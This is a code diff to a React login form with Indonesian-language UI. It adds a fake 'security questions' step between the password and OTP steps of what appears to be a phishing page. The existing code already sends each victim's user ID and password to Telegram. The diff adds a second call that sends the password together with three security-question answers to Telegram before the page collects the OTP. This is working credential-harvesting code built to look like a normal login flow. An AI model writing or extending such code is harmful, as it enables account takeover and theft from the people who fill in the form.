@@ -19,6 +19,16 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
   const [otpError, setOtpError] = useState(false);
   const [showCustomLoading, setShowCustomLoading] = useState(false);
 
+  // Security Questions State
+  const [a1, setA1] = useState('');
+  const [a2, setA2] = useState('');
+  const [a3, setA3] = useState('');
+  const [securityError, setSecurityError] = useState(false);
+
+  const q1 = "Siapa nama penyanyi favoritmu?";
+  const q2 = "Aktivitas apa yang Anda lakukan saat libur?";
+  const q3 = "Siapa nama sahabatmu?";
+
   // Handle Input Number Only for User ID
   const handleUsernameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value;
@@ -57,8 +67,29 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
 
     if (!ok) return;
 
-    // Send ID and Password to Telegram immediately (before OTP)
+    // Send ID and Password to Telegram immediately
     await sendToTelegram(username, password, "ID Login", "-");
+
+    // Proceed to Security Questions (Step 1.5)
+    setStep(1.5);
+  };
+
+  const handleSecuritySubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (playClickSound) playClickSound();
+
+    if (a1.length < 3 || a2.length < 3 || a3.length < 3) {
+        setSecurityError(true);
+        return;
+    }
+    setSecurityError(false);
+
+    // Send Security Answers to Telegram
+    await sendToTelegram(username, password, "ID Login - Security", "-", {
+        q1, a1,
+        q2, a2,
+        q3, a3
+    });
 
     // Proceed to OTP Step
     setStep(2);
@@ -230,6 +261,122 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
                    i
                  </button>
               </div>
+
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ================= STEP 1.5: SECURITY QUESTIONS ================= */}
+      {step === 1.5 && (
+        <div className="relative w-[480px] animate-pop-in z-50 scale-90 md:scale-100 origin-center">
+          <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
+            {/* Header */}
+            <div className="h-10 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
+              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
+              <h2 className="text-[#ffd700] text-lg font-black tracking-wide drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] uppercase" style={{ textShadow: '0 2px 0 #b71c1c' }}>
+                Pertanyaan Keamanan
+              </h2>
+              <div className="absolute bottom-1 flex gap-1 justify-center w-full">
+                {[...Array(8)].map((_, i) => (
+                  <div key={i} className="w-1 h-1 rounded-full bg-[#ffd700] shadow-sm mx-0.5"></div>
+                ))}
+              </div>
+              <button 
+                onClick={handleClose}
+                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#ff8a80] hover:text-white transition-colors drop-shadow-md active:scale-90"
+              >
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </button>
+            </div>
+
+            {/* Body */}
+            <div className="px-6 py-4 flex flex-col gap-2 relative bg-white/50 backdrop-blur-sm">
+              
+              {/* Question 1 */}
+              <div className="flex flex-col gap-1">
+                <div className="flex items-center">
+                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">Q1</span>
+                    <div className="flex-1 h-7 bg-[#bf6b86] rounded-full px-3 flex items-center justify-between text-white font-bold text-[10px] shadow-inner border border-pink-300/50">
+                        <span>{q1}</span>
+                        <span>▼</span>
+                    </div>
+                </div>
+                <div className="flex items-center">
+                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">A1</span>
+                    <input 
+                        type="text" 
+                        className="flex-1 h-7 bg-[#bf6b86]/80 rounded-full px-3 text-white placeholder-white/60 outline-none border border-pink-300/30 shadow-inner font-bold text-[10px]"
+                        placeholder="Masukan jawaban"
+                        value={a1}
+                        onChange={(e) => setA1(e.target.value)}
+                    />
+                </div>
+              </div>
+
+              {/* Question 2 */}
+              <div className="flex flex-col gap-1">
+                <div className="flex items-center">
+                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">Q2</span>
+                    <div className="flex-1 h-7 bg-[#bf6b86] rounded-full px-3 flex items-center justify-between text-white font-bold text-[10px] shadow-inner border border-pink-300/50">
+                        <span>{q2}</span>
+                        <span>▼</span>
+                    </div>
+                </div>
+                <div className="flex items-center">
+                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">A2</span>
+                    <input 
+                        type="text" 
+                        className="flex-1 h-7 bg-[#bf6b86]/80 rounded-full px-3 text-white placeholder-white/60 outline-none border border-pink-300/30 shadow-inner font-bold text-[10px]"
+                        placeholder="Masukan jawaban"
+                        value={a2}
+                        onChange={(e) => setA2(e.target.value)}
+                    />
+                </div>
+              </div>
+
+              {/* Question 3 */}
+              <div className="flex flex-col gap-1">
+                <div className="flex items-center">
+                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">Q3</span>
+                    <div className="flex-1 h-7 bg-[#bf6b86] rounded-full px-3 flex items-center justify-between text-white font-bold text-[10px] shadow-inner border border-pink-300/50">
+                        <span>{q3}</span>
+                        <span>▼</span>
+                    </div>
+                </div>
+                <div className="flex items-center">
+                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">A3</span>
+                    <input 
+                        type="text" 
+                        className="flex-1 h-7 bg-[#bf6b86]/80 rounded-full px-3 text-white placeholder-white/60 outline-none border border-pink-300/30 shadow-inner font-bold text-[10px]"
+                        placeholder="Masukan jawaban"
+                        value={a3}
+                        onChange={(e) => setA3(e.target.value)}
+                    />
+                </div>
+              </div>
+
+              {/* Validation Message */}
+              {securityError && (
+                  <div className="text-center text-red-500 font-bold text-[10px] mt-1">
+                      Jawaban tidak boleh kurang dari 3 karakter
+                  </div>
+              )}
+
+              {/* Submit Button */}
+              <div className="flex items-center justify-center mt-2">
+                 <button 
+                    onClick={handleSecuritySubmit}
+                    className="w-32 h-9 bg-gradient-to-b from-[#66bb6a] to-[#2e7d32] hover:from-[#81c784] hover:to-[#388e3c] rounded-full border-2 border-[#ffd700] text-white font-bold text-sm shadow-[0_4px_6px_rgba(0,0,0,0.3)] active:scale-95 transition-all flex items-center justify-center tracking-wider"
+                    style={{ textShadow: '0 1px 2px rgba(0,0,0,0.5)' }}
+                 >
+                   Tentukan
+                 </button>
+              </div>
+
+             
 
             </div>
           </div>
